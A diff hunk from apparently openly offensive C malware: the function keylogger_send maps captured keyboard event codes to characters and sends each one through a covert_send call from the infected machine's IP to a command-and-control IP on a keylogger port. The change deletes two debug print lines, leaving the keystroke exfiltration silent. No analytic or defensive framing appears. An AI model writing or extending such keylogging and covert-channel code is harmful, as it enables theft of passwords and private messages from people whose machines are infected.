@@ -202,8 +202,6 @@ void *keylogger_send(void *args_input) {
 
                         while(keycodes[events[i].code][j] != '\0') {
                             ch[0] = keycodes[events[i].code][j];
-                            //printf("DEBUG: %c\n", keycodes[events[i].code][j]);
-                            printf("DEBUG: %c\n", ch[0]);
                             covert_send(args->infected_ip, args->cnc_ip, KEYLOGGER_PORT, KEYLOGGER_PORT, (unsigned char*) ch, 1);
                             j++;
                         }
